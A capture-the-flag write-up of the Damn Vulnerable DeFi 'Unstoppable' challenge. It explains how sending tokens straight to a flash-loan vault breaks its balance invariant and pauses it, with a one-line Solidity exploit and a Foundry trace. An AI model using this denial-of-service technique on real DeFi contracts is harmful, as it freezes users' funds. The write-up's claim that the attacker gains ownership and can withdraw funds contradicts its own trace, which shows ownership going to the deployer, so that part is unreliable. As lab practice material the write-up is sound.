
#  Unstoppable Challenge

## Challenge Overview
This challenge involves exploiting a flashloan vulnerability in the UnstoppableVault contract. The vault offers flash loans with a fee and allows the owner to pause the contract and execute arbitrary changes. The goal is to exploit the flashloan mechanism, triggering an unwanted state change.

##  Smart Contract Breakdown

###  Important State Variables
- `FEE_FACTOR`: The fee for flashloans (5%).
- `GRACE_PERIOD`: The period after which the flashloan fee changes.
- `feeRecipient`: The address to which the flashloan fees are sent.
- `end`: The timestamp that determines the end of the grace period.

###  Critical Functions
- **`maxFlashLoan`**: Returns the maximum amount for a flashloan based on the total assets in the vault.
- **`flashFee`**: Calculates the fee for the flashloan.
- **`flashLoan`**: Executes the flashloan by transferring tokens, calling the borrower's callback, and ensuring the correct fee is returned.
- **`execute`**: Allows the owner to execute arbitrary changes when the contract is paused.
- **`setPause`**: Pauses or unpauses the vault.

### ⚠️ Potential Vulnerability
The vault is vulnerable to a **Denial of Service (DoS) attack** via the flashloan function. An attacker can trigger a failure in the `flashLoan` function, causing the vault to enter a paused state and preventing further flashloans.

##  Vulnerability Explained
The vulnerability occurs when the `flashLoan` function fails due to an invalid state (e.g., an incorrect balance). If this happens, the vault is paused, and ownership is transferred to the attacker. This results in the vault being stuck in a paused state, rendering the flashloan feature unusable.

##  Exploit Strategy
1. **FlashLoan Attack**: The attacker initiates a flashloan with an invalid amount or token to trigger the revert condition in the `flashLoan` function.
2. **Vault Pause**: Upon failure, the vault enters a paused state, preventing any further flashloans.
3. **Ownership Transfer**: The attacker gains control of the vault by transferring ownership, allowing them to alter the contract or withdraw funds.

##  Exploit Code (Solidity)

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    // DOS attack by using an external call to the vault to stop the flashloan
    token.transfer(address(vault), 2);
}
```
### Proof of exploit 

```yaml
Ran 1 test for test/unstoppable/Unstoppable.t.sol:UnstoppableChallenge
[PASS] test_unstoppable() (gas: 74607)
Traces:
  [74607] UnstoppableChallenge::test_unstoppable()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [13251] DamnValuableToken::transfer(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 2)
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], amount: 2)
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   └─ ← [Return]
    ├─ [0] VM::expectEmit()
    │   └─ ← [Return]
    ├─ emit FlashLoanStatus(success: false)
    ├─ [33550] UnstoppableMonitor::checkFlashLoan(100000000000000000000 [1e20])
    │   ├─ [593] UnstoppableVault::asset() [staticcall]
    │   │   └─ ← [Return] DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
    │   ├─ [9016] UnstoppableVault::flashLoan(UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 100000000000000000000 [1e20], 0x)
    │   │   ├─ [802] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000002 [1e24]
    │   │   ├─ [802] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000002 [1e24]
    │   │   └─ ← [Revert] InvalidBalance()
    │   ├─ emit FlashLoanStatus(success: false)
    │   ├─ [9287] UnstoppableVault::setPause(true)
    │   │   ├─ emit Paused(account: UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5])
    │   │   └─ ← [Stop]
    │   ├─ [5379] UnstoppableVault::transferOwnership(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   │   ├─ emit OwnershipTransferred(previousOwner: UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], newOwner: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [518] UnstoppableVault::paused() [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true, "Vault is not paused") [staticcall]
    │   └─ ← [Return]
    ├─ [573] UnstoppableVault::owner() [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], "Vault did not change owner") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.19ms (895.44µs CPU time)

Ran 1 test suite in 2.46s (7.19ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/damn-vulnerable-defi)